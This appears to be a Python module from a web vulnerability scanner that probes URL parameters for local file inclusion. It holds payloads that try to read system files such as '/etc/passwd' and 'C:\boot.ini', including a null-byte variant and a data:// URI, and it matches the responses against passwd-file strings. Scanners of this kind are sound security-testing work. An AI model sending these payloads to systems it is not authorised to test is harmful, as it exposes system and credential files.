
from core.scan.module import GeneralScanner

class LFI(GeneralScanner):

    def __init__(self, config) -> None:
        GeneralScanner.__init__(self, config)

    def check(self):
        endpoint = self.GetEndPoint()
        params = endpoint.GetAllParams()

        for param , value in params.items():
            
            if value.startswith("http") or endpoint.GetParmTypeByName(param) in ('submit', 'file', 'url'):
                continue
            
            self.may_vulnerable_params.append(param)

        return bool(self.may_vulnerable_params)

    def GetPayloads(self) -> list:
        return [
            "data://text/plain;base64,TEZJQjAwTQ==",
            "/etc/passwd","file://etc/passwd","/etc/passwd\x00",
            "C:\\boot.ini"
        ]
              
    def is_vulnerable(self,res):
        expected_response = [
            "LFIB00M", "Volume Serial",
            "root:x:0:0","/root:/bin/bash","daemon","/usr/sbin/nologin" 
        ]

        for text in expected_response:
            if text.lower() in res.text.lower():
                return True

        return False
        